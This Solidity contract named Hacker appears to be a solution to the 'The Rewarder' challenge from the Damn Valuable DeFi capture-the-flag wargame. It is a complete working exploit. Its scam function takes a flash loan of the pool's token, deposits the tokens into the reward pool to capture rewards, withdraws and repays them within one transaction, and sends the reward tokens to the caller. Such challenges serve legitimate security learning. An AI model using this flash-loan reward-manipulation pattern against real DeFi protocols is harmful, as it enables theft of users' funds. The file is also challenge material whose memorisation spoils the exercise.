pragma solidity ^0.6.0;

import "../the-rewarder/TheRewarderPool.sol";
import "../the-rewarder/FlashLoanerPool.sol";

import "../the-rewarder/RewardToken.sol";
import "../DamnValuableToken.sol";

contract Hacker {
    TheRewarderPool public rewarderPool;
    FlashLoanerPool public flashLoanerPool;

    RewardToken public rewardToken;
    DamnValuableToken public damnValuableToken;

    constructor(
        address rewarderPoolAddress,
        address flashLoanerPoolAddress, 
        address rewardTokenAddress,
        address damnValuableTokenAddress
    ) public {
        rewarderPool = TheRewarderPool(rewarderPoolAddress);
        flashLoanerPool = FlashLoanerPool(flashLoanerPoolAddress);
        rewardToken = RewardToken(rewardTokenAddress);
        damnValuableToken = DamnValuableToken(damnValuableTokenAddress);
    }

    function scam(uint256 amount) public {
        flashLoanerPool.flashLoan(amount);
        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
    }

    function receiveFlashLoan(uint256 amount) public {
        damnValuableToken.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);
        rewarderPool.withdraw(amount);
        damnValuableToken.transfer(msg.sender, amount);
    }
}